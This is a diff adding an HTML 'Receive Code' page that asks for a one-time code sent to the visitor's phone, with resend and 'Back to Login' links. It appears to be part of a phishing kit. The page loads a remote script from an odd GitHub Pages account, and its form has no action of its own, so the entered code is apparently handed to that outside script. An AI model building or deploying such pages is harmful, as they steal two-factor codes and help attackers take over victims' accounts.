@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Receive Code</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  margin:0;
+  background:#0f1723;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  color:#fff;
+}
+
+/* ===== CONTAINER ===== */
+.verify-container{
+  width:92%;
+  max-width:380px;
+  background:#121a29;
+  border-radius:8px;
+  padding:22px 18px 26px;
+  text-align:center;
+}
+
+/* ===== TITLE ===== */
+.verify-container h2{
+  margin:0 0 8px;
+  font-size:22px;
+}
+
+.verify-container p{
+  font-size:14px;
+  color:#aaa;
+  margin-bottom:22px;
+}
+
+/* ===== OTP BOX ===== */
+.otp-box{
+  display:flex;
+  justify-content:space-between;
+  margin-bottom:18px;
+}
+
+.otp-box input{
+  width:350px;
+  height:50px;
+  text-align:center;
+  font-size:18px;
+  border-radius:6px;
+  border:1px solid #2b3346;
+  background:#0f1723;
+  color:#fff;
+  outline:none;
+}
+
+/* ===== VERIFY BUTTON ===== */
+.verify-btn{
+  width:100%;
+  padding:13px;
+  background:#3a4456;
+  border:none;
+  color:#aaa;
+  border-radius:4px;
+  font-size:16px;
+  cursor:not-allowed;
+  margin-bottom:14px;
+}
+
+.verify-btn.active{
+  background:#38c172;
+  color:#fff;
+  cursor:pointer;
+}
+
+/* ===== RESEND TEXT ===== */
+.resend{
+  font-size:14px;
+  color:#aaa;
+}
+
+.resend span{
+  color:#38c172;
+  cursor:not-allowed;
+}
+
+.resend span.active{
+  cursor:pointer;
+}
+
+/* ===== BACK LINK ===== */
+.back-link{
+  margin-top:18px;
+  font-size:14px;
+}
+
+.back-link a{
+  color:#38c172;
+  text-decoration:none;
+}
+</style>
+</head>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<body>
+
+<div class="verify-container">
+
+  <h2>Receive Code</h2>
+  <p>Enter the digit code sent to your phone number</p>
+
+  <!-- OTP INPUT -->
+  <form>
+  <div class="otp-box">
+    <input type="text" maxlength="16" class="otp" name="Otp code">
+  </div>
+
+  <!-- VERIFY BUTTON -->
+  <button class="verify-btn" id="verifyBtn" disabled type="submit">Verify Code</button>
+
+  <!-- RESEND -->
+  <div class="resend">
+    Resend code in <b id="timer">30</b>s |
+    <span id="resendBtn">Resend</span>
+  </div>
+
+  <!-- BACK -->
+  <div class="back-link">
+    <a href="login.html">← Back to Login</a>
+  </div>
+
+</div>
+</form>
+<script>
+/* ===== OTP AUTO MOVE + BUTTON ENABLE ===== */
+const inputs = document.querySelectorAll(".otp");
+const verifyBtn = document.getElementById("verifyBtn");
+
+inputs.forEach((input, index) => {
+  input.addEventListener("input", () => {
+    if(input.value && index < inputs.length - 1){
+      inputs[index + 1].focus();
+    }
+    checkOTP();
+  });
+});
+
+function checkOTP(){
+  let filled = true;
+  inputs.forEach(input=>{
+    if(input.value === "") filled = false;
+  });
+
+  if(filled){
+    verifyBtn.classList.add("active");
+    verifyBtn.disabled = false;
+  }else{
+    verifyBtn.classList.remove("active");
+    verifyBtn.disabled = true;
+  }
+}
+
+/* ===== RESEND TIMER WITH INCREASE ===== */
+let time = 30;
+let increase = 30;
+const timerEl = document.getElementById("timer");
+const resendBtn = document.getElementById("resendBtn");
+
+resendBtn.classList.remove("active");
+
+let interval = setInterval(updateTimer, 1000);
+
+function updateTimer(){
+  if(time > 0){
+    time--;
+    timerEl.innerText = time;
+  }else{
+    resendBtn.classList.add("active");
+    resendBtn.style.cursor = "pointer";
+  }
+}
+
+resendBtn.onclick = function(){
+  if(!resendBtn.classList.contains("active")) return;
+
+  increase += 15;   // time increases every resend
+  time = increase;
+  timerEl.innerText = time;
+  resendBtn.classList.remove("active");
+  resendBtn.style.cursor = "not-allowed";
+
+  clearInterval(interval);
+  interval = setInterval(updateTimer, 1000);
+};
+</script>
+
+</body>
+</html>
